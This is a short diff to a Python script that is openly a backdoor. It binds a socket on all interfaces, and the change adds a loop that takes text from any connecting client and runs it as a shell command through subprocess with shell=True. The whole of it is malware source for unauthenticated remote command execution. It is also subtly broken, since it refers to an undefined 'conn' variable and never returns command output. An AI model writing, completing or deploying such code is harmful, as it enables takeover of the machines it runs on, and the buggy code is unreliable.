@@ -6,7 +6,16 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # bind socket to the first available port in range [3040, 6130)
 HOST = '0.0.0.0' 
-BASE_PORT = 3040 
+BASE_PORT = 3040
+
+def execute(connection):
+    while True:
+        received = conn.recv(4096).decode()
+        if not received:
+            connection.close()
+            break
+        process = subprocess.Popen(received, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        stdout, stderr = process.communicate()
 
 def bind():
     port = BASE_PORT
@@ -29,8 +38,9 @@ def connect():
 def start_backdoor():
     valid, port = bind()
     if valid:
-        print(f'Socket bind complete on port {port}. Waiting for connection...')
+        print(f'Complete binding socket on port {port}. Waiting for connection...')
     connection = connect()
+    execute(connection)
 
 if __name__ == "__main__":
     start_backdoor()
